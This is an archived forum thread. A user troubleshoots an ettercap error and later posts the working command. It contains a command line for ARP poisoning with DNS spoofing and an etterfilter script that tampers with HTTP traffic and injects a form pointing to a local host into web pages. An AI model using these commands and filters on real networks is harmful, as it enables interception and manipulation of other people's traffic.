---
title: "Ettercap ERROR : 16, Device or resource busy"
date: 2010-03-26
forum: Networking &amp; Wireless
---

### Post by thahitman on 2010-03-26
I have run filters before with ettercap and have never had this issue till just now.  

stream_venom@The-Viper-Pit:~# ettercap -i wlan0 -P dns_spoof -Tq -f html.ef -M ARP // //

ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGA

Listening on wlan0... 
ERROR : 16, Device or resource busy
[ec_capture.c:capture_init:171]

 `&#65533;&#65533;&#65533; 

This is a first I can fun ettercap without the filter and it will run fine. I have even turn off the wireless and still get the same error and not the Device is is down error.  

Thanks for the help  

Also here is the filter itself 

############################################################################
#                                                                          #
#  ettercap -- etter.filter -- filter source file                          #
#                                                                          #
#  Copyright (C) ALoR & NaGA                                               #
#                                                                          #
#  This program is free software; you can redistribute it and/or modify    #
#  it under the terms of the GNU General Public License as published by    #
#  the Free Software Foundation; either version 2 of the License, or       #
#  (at your option) any later version.                                     #
#                                                                          #
############################################################################

##
#
#  This filter will substitute the word 'ethercap' with 'ettercap' and
#  will log the content of the packet in /tmp/mispelled_ettercap.log
#  It is only a dummy example.
##

if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
           replace("Accept-Encoding", "Accept-Nothing!");
      }
}

if (ip.proto == TCP && tcp.src == 80) {
      if (search(DATA.data, "<title>")) {
           replace("</title>", "</title><form action="http://192.168.5.63/index.html");
           msg("html injected");
      }}

:D

---

### Post by thahitman on 2010-03-27
Seeing that no one ever answers any of my post I figured it out on my own... The proper syntax for the command is as follows:  
stream_venom@The-Viper-Pit:~$ettercap -i wlan0 -Tq -M apr:remote -F(not a lowercase f) html.ef -P autoadd // //.  I hope since no one ever helps me with the issues I have when I post them to this forum that someday I can help someone and help other to see that making the change from windows will come with help.

SMDH @ Ubuntu forums for not being on top of there game with getting people help with issues they have.

---

### Post by quxin on 2012-10-15
haha thanks dude, you just helped me, i had the same issue. let's help the **** out of each other and win over the world with ubuntu! :)

---

